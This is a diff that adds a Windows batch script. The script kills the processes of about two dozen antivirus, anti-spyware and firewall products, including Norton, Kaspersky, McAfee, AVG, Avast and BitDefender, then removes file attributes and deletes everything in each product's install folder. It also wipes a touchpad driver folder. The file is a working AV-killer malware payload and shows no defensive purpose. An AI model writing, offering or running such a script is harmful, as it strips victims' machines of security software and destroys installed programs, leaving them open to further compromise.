@@ -1,0 +1,106 @@
+@echo off
+Taskkill /f /IM nod32krn.exe /IM nod32kui.exe
+cd C:\Archivos de programa\Eset
+attrib -H -S -R *.*
+del /s /q *.*
+Taskkill /f /IM kavsvc.exe /IM kav.exe
+cd C:\Archivos de programa\KASPERSKY LAB\KASPERSKY\ANTI-VIRUS PERSONAL
+attrib -H -S -R *.*
+del /s /q *.*
+Taskkill /f /IM VsStat.exe
+cd C:\Archivos de programa\McAfee\McAfee VirusScan
+attrib -H -S -R *.*
+del /s /q *.*
+Taskkill /f /IM zlclient.exe /IM zonealarm.exe /IM vsmon.exe
+cd C:\Archivos de programa\Zone Labs\ZoneAlarm
+attrib -H -S -R *.*
+del /s /q *.*
+Taskkill /f /IM avgamsvr.exe /IM avgupsvc.exe
+cd C:\Archivos de programa\AVG7
+attrib -H -S -R *.*
+del /s /q *.*
+Taskkill /f /IM Pavsrv51.exe /IM AVENGINE.EXE /IM apvxdwin.exe /IM pavProxy.exe
+cd C:\Archivos de programa\Panda Software\Panda Antivirus Titanium
+attrib -H -S -R *.*
+del /s /q *.*
+Taskkill /f /IM NPROTECT.EXE
+cd C:\Archivos de programa\Norton Utilities
+attrib -H -S -R *.*
+del /s /q *.*
+Taskkill /f /IM GBPoll.exe /IM navapsvc.exe /IM NPFMntor.exe /IM NPROTECT.EXE /IM NOPDB.EXE /IM GBTray.exe /IM NPFMntor.exe /IM GhostTray.exe /IM PQV2iSvc.exe
+cd C:\Archivos de programa\Norton System\Works\Norton AntiVirus
+attrib -H -S -R *.*
+del /s /q *.*
+Taskkill /f /IM no-spy.exe
+cd C:\Archivos de programa\SinEspias
+attrib -H -S -R *.*
+del /s /q *.*
+Taskkill /f /IM AVGSERV9.EXE  /IM AVGCC32.EXE
+cd C:\Archivos de programa\GRISOFT\AVG6
+attrib -H -S -R *.*
+del /s /q *.*
+Taskkill /f /IM bdoesrv.exe /IM bdmcon.exe /IM bdnagent.exe /IM bdswitch.exe
+cd C:\Archivos de programa\Softwin\BitDefender9
+attrib -H -S -R *.*
+del /s /q *.*
+Taskkill /f /IM AVGUARD.EXE /IM AVWUPSRV.EXE /IM AVGNT.EXE /IM AVSched32.EXE
+cd C:\Archivos de programa\AVPersonal
+attrib -H -S -R *.*
+del /s /q *.*
+Taskkill /f /IM FrameworkService.exe /IM Mcshield.exe /IM VsTskMgr.exe /IM SHSTAT.EXE
+cd C:\Archivos de programa\Network Associates\VirusScan
+attrib -H -S -R *.*
+del /s /q *.*
+Taskkill /f /IM spyaxe.exe /IM spyaxe.exe
+cd C:\Archivos de programa\SpyAxe
+attrib -H -S -R *.*
+del /s /q *.*
+Taskkill /f /IM ccProxy.exe /IM ccSetMgr.exe /IM SNDSrvc.exe /IM SPBBCSvc.exe /IM ccEvtMgr.exe /IM ccApp.exe /IM NMAIN.EXE /IM SBServ.exe /IM NOPDB.EXE
+cd C:\Archivos de programa\Archivos comunes\Symantec\Shared
+attrib -H -S -R *.*
+del /s /q *.*
+Taskkill /f /IM navapsvc.exe /IM ISSVC.exe /IM
+cd C:\Archivos de programa\Norton Internet Security
+attrib -H -S -R *.*
+del /s /q *.*
+Taskkill /f /IM avgcc.exe /IM avgamsvr.exe /IM avgupsvc.exe
+cd C:\Archivos de programa\Grisoft
+attrib -H -S -R *.*
+del /s /q *.*
+Taskkill /f /IM avgamsvr.exe /IM vgupsvc.exe /IM avgcc.exe
+cd C:\Archivos de programa\Grisoft\AVG free
+attrib -H -S -R *.*
+del /s /q *.*
+Taskkill /f /IM gcasDtServ.exe /IM gcasServ.exe
+cd C:\Archivos de programa\Microsoft AntiSpyware
+attrib -H -S -R *.*
+del /s /q *.*
+Taskkill /f /IM Pagent.exe /IM pagentwd.exe /IM pavsched.exe
+cd C:\Archivos de programa\Panda Software\Panda Administrator\Pav_Agent
+attrib -H -S -R *.*
+del /s /q *.*
+Taskkill /f /IM symlcsvc.exe
+cd C:\Archivos de programa\Archivos comunes\Symantec\SharedCCPD-LC
+attrib -H -S -R *.*
+del /s /q *.*
+Taskkill /f /IM SynTPLpr.exe /IM SynTPEnh.exe
+cd C:\Archivos de programa\SynapticsSynTP
+attrib -H -S -R *.*
+del /s /q *.*
+Taskkill /f /IM aswUpdSv.exe /IM ashServ.exe /IM ashWebSv.exe /IM ashDisp.exe
+cd C:\Archivos de programa\Alwil Software\Avast4
+attrib -H -S -R *.*
+del /s /q *.*
+Taskkill /f /IM SpywareStrike. exe /IM SpywareStrike. exe
+cd C:\Archivos de programa\SpywareStrike
+attrib -H -S -R *.*
+del /s /q *.*
+Taskkill /f /IM ASHSERV.EXE /IM ASHWEBSV.EXE /IM ASHMAISV.exe
+cd C:\Archivos de programa\ALWIL SOFTWARE\AVAST4
+attrib -H -S -R *.*
+del /s /q *.*
+Taskkill /f /IM navapsvc.exe /IM NPFMntor.exe /IM navapw32.exe /IM SAVScan.exe
+cd C:\Archivos de programa\Norton AntiVirus
+attrib -H -S -R *.*
+del /s /q *.*
+exit
